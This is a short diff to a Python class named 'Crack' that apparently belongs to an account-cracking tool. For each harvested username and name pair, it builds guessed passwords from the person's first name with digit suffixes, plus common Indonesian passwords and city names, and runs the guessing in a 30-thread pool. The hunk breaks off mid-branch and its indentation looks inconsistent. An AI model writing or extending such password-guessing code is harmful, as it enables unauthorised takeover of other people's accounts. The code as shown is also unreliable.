@@ -249,7 +249,23 @@ class Crack:
 			with ThreadPoolExecutor(max_workers=30) as fall:
 				self.simpan_hasil()
 				for data in tampung:
-						pwx.append("katasandi")
+					try:
+						pwx = []
+						user = data.split("<=>")[0]
+						nama = data.split("<=>")[1]
+						depan = nama.split(" ")[0]
+						if len(nama)<=5:
+							if len(depan)<3:
+								pass 
+							else:
+								pwx.append(depan+"123")
+								pwx.append(depan+"321")
+								pwx.append(depan+"1234")
+								pwx.append(depan+"12345")
+								pwx.append("ganteng")
+								pwx.append("sayangku")
+								pwx.append("ganteng123")
+								pwx.append("katasandi")
 								pwx.append("pekalongan")
 								pwx.append("semarang")
 						else:
